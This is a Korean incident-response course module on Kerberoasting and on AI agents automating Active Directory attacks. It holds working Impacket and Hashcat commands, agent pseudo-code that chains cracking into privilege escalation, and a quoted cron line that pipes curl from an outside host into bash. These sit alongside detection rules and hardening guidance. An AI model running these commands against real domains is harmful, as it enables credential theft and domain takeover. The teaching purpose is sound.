# Week 03: AD Kerberoasting 자동화 — 에이전트가 도메인을 분 단위로 장악한다

## 이번 주의 위치
공급망·웹 입력을 살펴본 뒤, 이번 주는 **기업 내부 인증 인프라**인 Active Directory(AD)의 고전 공격이 *에이전트화*되는 양상을 다룬다. Kerberoasting은 새로운 공격이 아니다. 핵심 변화는 **BloodHound + SharpHound + Hashcat**의 조합을 에이전트가 *연속 파이프라인*으로 수행한다는 점이다. 기존 며칠이 걸리던 AD 침투가 **30~60분**으로 단축된다. 이번 주는 이 공격의 *전체 IR*을 본다.

## 학습 목표
- Kerberos 인증의 *공격 표면*(TGT·TGS·SPN)을 이해한다
- Kerberoasting·AS-REP Roasting·DCSync의 차이를 안다
- 에이전트가 BloodHound 데이터 수집·Cypher 쿼리·티켓 요청·크랙을 *자동화*하는 과정을 관찰한다
- 6단계 IR 절차를 AD 사고에 적용한다
- Human vs Agent 대응 비교 + 조직의 *AD 하드닝* 체크리스트 생성

## 전제 조건
- C19 · C20 w1~w2
- Active Directory 기본 (OU·GPO·Kerberos)
- 해시·크래킹 개념

## 실습 환경 (추가)
- `dc` VM (10.20.30.60) — Samba 4 AD DC 모사 (교육용)
- 샘플 사용자·SPN 미리 배포

## 강의 시간 배분 (3시간)

| 시간 | 내용 |
|------|------|
| 0:00-0:40 | Part 1: 공격 해부 |
| 0:40-1:10 | Part 2: 탐지 |
| 1:10-1:20 | 휴식 |
| 1:20-1:50 | Part 3: 분석 |
| 1:50-2:30 | Part 4: 초동대응 (Human vs Agent) |
| 2:30-2:40 | 휴식 |
| 2:40-3:10 | Part 5: 보고·공유 |
| 3:10-3:30 | Part 6: 재발방지 |
| 3:30-3:40 | 퀴즈 + 과제 |

---

## 용어 해설

| 용어 | 설명 |
|------|------|
| **TGT** | Ticket Granting Ticket — 사용자 로그인 증명서 |
| **TGS** | Ticket Granting Service ticket — 특정 서비스 접근 증명 |
| **SPN** | Service Principal Name — 서비스 식별자 (예: `MSSQLSvc/host:1433`) |
| **Kerberoasting** | SPN을 가진 계정의 TGS를 요청해 *오프라인 크랙* |
| **AS-REP Roasting** | 사전 인증 비활성 계정의 AS-REP를 *오프라인 크랙* |
| **DCSync** | 도메인 복제 권한으로 *전체 해시 덤프* |
| **Golden Ticket** | `krbtgt` 해시로 임의 TGT 위조 |
| **BloodHound** | AD 관계 그래프 분석 도구 |
| **SharpHound** | BloodHound의 *수집기* (.NET) |

---

# Part 1: 공격 해부 (40분)

## 1.1 Kerberos 인증 흐름과 공격점

```mermaid
sequenceDiagram
    participant U as 사용자
    participant KDC as KDC (DC)
    participant S as 서비스
    U->>KDC: AS-REQ (인증 요청)
    KDC-->>U: AS-REP (TGT · krbtgt 키로 암호화)
    U->>KDC: TGS-REQ (+ TGT)
    KDC-->>U: TGS-REP (TGS · 서비스 계정 해시로 암호화)
    Note right of KDC: ⚠ 여기가 Kerberoasting 지점
    U->>S: 서비스 접근 (+ TGS)
```

공격점: **TGS-REP가 *서비스 계정의 암호 해시*로 암호화됨** → 약한 서비스 계정 암호면 *오프라인 크랙 가능*.

## 1.2 Kerberoasting 공격 절차

```mermaid
flowchart TB
    S1["① 도메인 인증 성공<br/>(일반 사용자)"]
    S2["② SPN 가진 계정 열거<br/>(LDAP 쿼리)"]
    S3["③ 각 SPN의 TGS 요청"]
    S4["④ 받은 TGS 저장<br/>(kirbi → hashcat 포맷)"]
    S5["⑤ Hashcat 오프라인 크랙<br/>(사전·마스크 공격)"]
    S6["⑥ 성공 → 서비스 계정 탈취"]
    S1 --> S2 --> S3 --> S4 --> S5 --> S6
    style S5 fill:#1a0a0a,stroke:#f85149,color:#e6edf3
    style S6 fill:#1a0a0a,stroke:#f85149,color:#e6edf3
```

## 1.3 에이전트 자동화

```mermaid
flowchart TB
    A1["SharpHound 자동 실행<br/>AD 데이터 수집 (zip)"]
    A2["Bloodhound에 로드 + Cypher 쿼리<br/>'Kerberoastable Users'"]
    A3["Rubeus·Impacket GetUserSPNs<br/>일괄 요청"]
    A4["TGS → hashcat 포맷 변환"]
    A5["GPU 백엔드에서 분산 크랙<br/>rockyou + rules"]
    A6["성공 계정 → 자동 권한 확장<br/>(DCSync·pass-the-ticket)"]
    A1 --> A2 --> A3 --> A4 --> A5 --> A6
    style A3 fill:#1a0a0a,stroke:#f85149,color:#e6edf3
    style A6 fill:#1a0a0a,stroke:#f85149,color:#e6edf3
```

에이전트의 우위:
- BloodHound의 *Cypher 결과*를 자연어로 *직접 해석* → 우선순위 자동 판단
- 실패 시 *다른 공격 경로*(AS-REP Roasting, Unconstrained Delegation) 자동 전환
- 크랙 완료 시 *즉시* 다음 단계 실행

## 1.4 Kerberoasting의 실제 명령 흐름

### 수집 (Impacket)
```bash
impacket-GetUserSPNs -request domain/user:pass -dc-ip 10.20.30.60
# 각 SPN 계정의 TGS가 `$krb5tgs$23$*` 형식으로 저장됨
```

### 크랙 (Hashcat)
```bash
hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule
# -m 13100 = Kerberos 5 TGS-REP etype 23
```

### 에이전트 통합
```python
# 에이전트 의사 코드
spns = run("impacket-GetUserSPNs ...")
for spn in parse(spns):
    save_hash(spn)
results = run("hashcat -m 13100 ...")
for cracked in parse(results):
    operator = pick_next_move(cracked)  # LLM 판단
    run(operator.cmd)
```

---

# Part 2: 탐지 (30분)

## 2.1 탐지의 3관측점

```mermaid
flowchart TB
    O1["관측점 1: DC 이벤트 로그<br/>(Security 4769)"]
    O2["관측점 2: SharpHound 수집 흔적<br/>LDAP 쿼리 폭주"]
    O3["관측점 3: 외부 egress<br/>TGS zip 반출"]
    O1 & O2 & O3 --> V["고신뢰 판정"]
    style V fill:#21262d,stroke:#f97316,color:#e6edf3
```

## 2.2 Windows Event 4769 패턴

- Event ID: **4769** (Kerberos service ticket requested)
- Ticket Encryption Type: **0x17** (RC4-HMAC — 취약)
- Account Name: 일반 사용자
- Service Name: 여러 SPN 계정에 대해 *연속 요청*

### SIGMA 룰

```yaml
title: Kerberoasting — 4769 RC4 burst
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  timeframe: 60s
  condition: selection | count(ServiceName) by AccountName > 5
falsepositives:
  - 레거시 서비스 다수 사용
level: high
```

## 2.3 SharpHound 수집 흔적 — LDAP

- LDAP search filter가 `(objectClass=*)` 같은 *대량 조회*
- 결과 크기가 이례적
- 특정 사용자 계정이 *거의 모든 OU*를 조회

## 2.4 Bastion 스킬 — `detect_kerberoasting`

```python
def detect_kerberoasting(windows_events):
    by_user = {}
    for e in windows_events:
        if e.event_id == 4769 and e.ticket_enc_type == "0x17":
            by_user.setdefault(e.account_name, set()).add(e.service_name)
    return [(u, list(s)) for u, s in by_user.items() if len(s) >= 5]
```

---

# Part 3: 분석 (30분)

## 3.1 분석 질문

1. 어떤 사용자 계정이 *공격 시작*인가?
2. 어떤 SPN들이 *열거*됐나?
3. 어떤 TGS가 *실제 크랙 성공*했나?
4. 크랙된 계정으로 *추가 공격* 있었나?
5. DCSync·Golden Ticket 단계까지 진행됐나?

## 3.2 분석 데이터 소스

```mermaid
flowchart TB
    DC["DC: Security log<br/>4769·4624·4662"]
    Sys["SysMon: 프로세스 생성<br/>(rubeus.exe·mimikatz.exe)"]
    Net["네트워크: LDAP·Kerberos 트래픽"]
    Edr["EDR: 메모리 덤프"]
    C["분석 엔진<br/>타임라인 재구성"]
    DC & Sys & Net & Edr --> C
    style C fill:#21262d,stroke:#f97316,color:#e6edf3
```

## 3.3 타임라인 재구성

```
T+00:00 초기 로그인 (4624) — user@domain
T+00:05 LDAP 대량 조회 (SharpHound)
T+00:10 4769 burst — 12 SPN에 대해 RC4 요청
T+00:15 외부 egress (SharpHound zip upload 의심)
T+00:45 (오프라인) 크랙 성공 추정
T+01:00 4624 — 크랙된 서비스 계정으로 로그인
T+01:05 4662 — 도메인 복제 권한 행사 (DCSync 의심)
```

---

# Part 4: 초동대응 (Human vs Agent · 40분)

## 4.1 Human 대응

```mermaid
flowchart TB
    H1["경보 수신"]
    H2["이벤트 로그 검토"]
    H3["의심 계정·SPN 목록 작성"]
    H4["보안팀 승인 요청"]
    H5["서비스 계정 비밀번호 강제 변경"]
    H6["krbtgt 해시 2회 회전 (표준)"]
    H7["공격자 IP 차단"]
    H1 --> H2 --> H3 --> H4 --> H5 --> H6 --> H7
```

소요: 2~8시간 (서비스 영향 고려 승인 포함).

## 4.2 Agent(Bastion) 대응

```mermaid
flowchart TB
    A1["경보 수신 (초)"]
    A2["Playbook: kerberoasting_contain"]
    A3["Step 1: 공격자 계정 세션 강제 종료"]
    A4["Step 2: 의심 SPN 계정 AccountLock<br/>(사람 승인 후)"]
    A5["Step 3: EDR·Sysmon 보강 로깅 활성"]
    A6["Step 4: krbtgt 회전 티켓 발행<br/>(사람 실행 필요)"]
    A1 --> A2 --> A3 --> A4 --> A5 --> A6
    style A4 fill:#21262d,stroke:#d29922,color:#e6edf3
    style A6 fill:#21262d,stroke:#d29922,color:#e6edf3
```

소요: 수 분 (자동 가능 부분) + 사람 승인 절차

### 4.2.1 왜 AD 사고는 *Agent 100% 자동*이 안 되나

AD는 *가용성*이 절대적이다. 잘못된 자동 차단은 *전사 로그인 장애*를 만든다.

- krbtgt 회전 → 전사 재인증 발생 (계획 필요)
- 서비스 계정 잠금 → 해당 서비스 다운
- 계정 잠금 → 정상 사용자 영향 가능

따라서 *억제는 빠르게*, *복구 조치는 사람 승인*으로 분리.

## 4.3 비교표

| 축 | Human | Agent |
|----|-------|-------|
| 첫 탐지 → 초기 격리 | 1~3시간 | **5~30분** |
| krbtgt 회전 결정 | 사람 | 사람 (에이전트는 준비만) |
| 영향 평가 | *강함* | 제한 |
| 24시간 모니터링 | 교대 근무 | **연속** |

---

# Part 5: 보고·상황 공유 (30분)

## 5.1 AD 사고의 특수성

AD 사고는 *도메인 전체 신뢰*에 영향. 다음 단계 공유 필수:

- **CISO·CEO 즉시**: 도메인 장악 가능성은 *사업 연속성 리스크*
- **법무**: GDPR·개인정보 영향 가능 (AD는 직원 정보 보유)
- **감사**: *도메인 복구 절차*가 감사 기록 대상
- **직원**: 강제 로그아웃·비밀번호 재설정 공지

## 5.2 임원 브리핑

```markdown
# Incident — Kerberoasting (D+30min)

**What happened**: 한 일반 계정에서 SPN 다수에 대한 RC4 TGS 요청 burst.
                  Bastion이 세션 종료·권한 제한 완료. krbtgt 회전은 D+1 (계획).

**Impact**: 12 SPN 열거. 크랙 여부 *확인 중*. 직원·고객 영향 *없음*.

**Ask**: krbtgt 2회 회전 (전사 재인증 동반)에 대한 D+1 승인.
```

## 5.3 기술팀 공유

- BloodHound 그래프 + 공격 경로 시각화
- 4769·4662 쿼리 필터 즉시 배포
- EDR에 Rubeus/Mimikatz 시그니처 업데이트

---

# Part 6: 재발방지 (20분)

## 6.1 AD 하드닝 5축

```mermaid
flowchart TB
    L1["1축 — 암호 강도<br/>서비스 계정 25자+ 무작위"]
    L2["2축 — 알고리즘<br/>AES 강제 (RC4 금지)"]
    L3["3축 — 원칙<br/>Managed Service Account"]
    L4["4축 — 감시<br/>4769 RC4 상시 모니터링"]
    L5["5축 — 분리<br/>Tier 0/1/2 관리 모델"]
    L1 --> L4
    L2 --> L4
    L3 --> L4
    L4 --> L5
    style L4 fill:#21262d,stroke:#f97316,color:#e6edf3
    style L5 fill:#0d1f0d,stroke:#3fb950,color:#e6edf3
```

## 6.2 각 축의 구체

### 1축 암호 강도
- 서비스 계정 25자 이상, 무작위 (사람 기억 불가능해야 함)
- MSA(Managed Service Account) 우선 — 암호 자동 관리

### 2축 알고리즘
```
Set-ADUser -Identity svc_account -KerberosEncryptionType AES128,AES256
```
RC4 요청은 *이제 의심*이다.

### 3축 MSA·gMSA
- gMSA(Group Managed Service Account)는 암호가 *자동 회전*
- 관리자가 암호를 모르는 상태가 정상

### 4축 상시 감시
- 4769 RC4 burst에 *즉시 경보*
- BloodHound collection 시도 자체 감지

### 5축 Tier 모델
- Tier 0 (DC·관리자) — 별도 관리 PC, 일반 네트워크 접근 금지
- Tier 1 (서버)
- Tier 2 (워크스테이션)

## 6.3 조직 체크리스트

- [ ] 모든 서비스 계정 암호 25자+·AES 강제
- [ ] gMSA 도입 (가능한 모든 서비스)
- [ ] 4769 RC4 SIGMA 룰 배포
- [ ] BloodHound 수집 흔적 탐지 룰
- [ ] Tier 0 관리 PC 분리
- [ ] krbtgt 연 2회 정기 회전
- [ ] 특권 계정 *별도 MFA*

---

## 과제

1. **공격 재현 (필수)**: 실습 AD에서 Kerberoasting PoC 성공 1건. TGS hash 파일 + 크랙 결과.
2. **6단계 IR 보고서 (필수)**: 공격→탐지→분석→초동대응→보고→재발방지.
3. **Human vs Agent 타임 비교 (필수)**: 두 모드 각각의 경과 시간.
4. **(선택 · 🏅 가산)**: BloodHound Cypher 쿼리 3개로 *공격 경로* 탐색 결과.
5. **(선택 · 🏅 가산)**: gMSA 도입 계획서 1쪽.

---

## 부록 A. 관련 ATT&CK 기법

- T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
- T1558.004 — AS-REP Roasting
- T1003.006 — DCSync
- T1207 — Rogue Domain Controller
- T1484.002 — Domain Trust Modification

## 부록 B. *Tier 0 관리 PC* 구성 참고 도식

```mermaid
flowchart TB
    T0["Tier 0 관리 PC<br/>전용 · 인터넷 격리"]
    DC["DC"]
    T1["Tier 1 서버"]
    T2["Tier 2 워크스테이션"]
    Net["인터넷"]
    T0 --> DC
    T1 --> Net
    T2 --> Net
    T1 -.-x T0
    T2 -.-x T0
    style T0 fill:#21262d,stroke:#f97316,color:#e6edf3
```

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (3주차) 학습 주제와 직접 연관된 *실제* incident:

### Linux cron + curl downloader — fileless persistence

> **출처**: WitFoo Precinct 6 / `incident-2024-08-005` (anchor: `anc-bf23b0106fe4`) · sanitized
> **시점**: 2024-08-25 ~ (지속, 5분 주기)

**관찰**: 10.20.30.80 의 /etc/cron.d/ 에 신규 항목 — 5분마다 `curl http://203.0.113.42/p.sh | bash` 실행.

**MITRE ATT&CK**: **T1053.003 (Scheduled Task: Cron)**, **T1105 (Ingress Tool Transfer)**

**IoC**:
  - `203.0.113.42`
  - `/etc/cron.d/<신규>`
  - `curl ... | bash`

**학습 포인트**:
- cron entry 자체만 디스크 흔적, 실제 페이로드는 *메모리에만* (fileless)
- 5분 주기 외부 outbound → SIEM 의 baseline 비교 시 강한 신호
- 탐지: auditd EXECVE (curl + http://* + bash 파이프), Wazuh syscheck (cron.d 파일 변경)
- 방어: outbound HTTP 화이트리스트, cron.d FIM, AppArmor curl 제한, EDR 메모리 스캔


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
